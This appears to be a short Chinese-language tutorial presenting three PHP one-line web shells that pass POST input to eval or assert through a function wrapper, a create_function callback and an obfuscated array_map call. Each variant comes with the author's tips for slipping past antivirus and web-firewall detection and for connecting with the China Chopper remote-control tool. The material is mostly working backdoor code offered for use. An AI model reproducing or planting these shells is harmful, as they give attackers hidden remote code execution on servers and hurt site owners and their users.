0x01：函数调用

*   
*   
*   
*   
*   
*   

```
<?phpfunction bihuo($a,$b){  eval($a);}bihuo($_POST[1],'必火安全是最好的培训机构');?>
```

此方法第二个参数$b,并没有实际意义，只是用来干扰，不加会被杀。

0x02: 回调

*   
*   
*   
*   

```
<?php$newfunc = create_function('', "$_POST[1];");$newfunc();?>
```

这个代码和网上流行的略有区别，第二个参数我加了双引号，加了就过狗，不加就不过。  

![](../Images/350e9245f7d5b8fc124a38d2d85a8ff1.png)

0x03: array\_map 变形

*   
*   
*   

```
<?php array_map(strrev(substr('bihuo.cntressa', 8)),$_POST);?>
```

这个函数用来写一句话，网上有很多，但是笔者觉得，都写的太麻烦了，主要是传值的时候，我改写了一下，首先是截取，然后再反转，直接菜刀链接，密码任意，这里接受的是$\_POST数组，所以，传什么都可以。

  

![](../Images/e56f4ca70d1d038d39b399097991b6c8.png)
